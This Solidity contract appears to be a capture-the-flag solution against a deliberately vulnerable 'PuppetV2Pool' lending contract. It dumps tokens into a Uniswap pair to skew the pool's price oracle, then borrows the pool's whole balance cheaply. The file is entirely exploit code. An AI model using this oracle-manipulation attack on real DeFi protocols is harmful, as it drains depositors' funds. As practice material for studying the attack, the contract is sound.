// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./PuppetV2Pool.sol";
import "hardhat/console.sol";

contract PuppetV2PoolExp {
    function exp(
        PuppetV2Pool pool,
        UniswapV2Router02 router,
        IERC20 token,
        IERC20 weth
    ) public {
        token.approve(address(router), uint256(-1));
        weth.approve(address(pool), uint256(-1));
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uint256 poolBalance = token.balanceOf(address(pool));
        console.log(
            "before swap: %s , %s",
            pool.calculateDepositOfWETHRequired(poolBalance),
            weth.balanceOf(address(this))
        );
        router.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        console.log(
            "after swap: %s , %s",
            pool.calculateDepositOfWETHRequired(poolBalance),
            weth.balanceOf(address(this))
        );
        pool.borrow(poolBalance);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
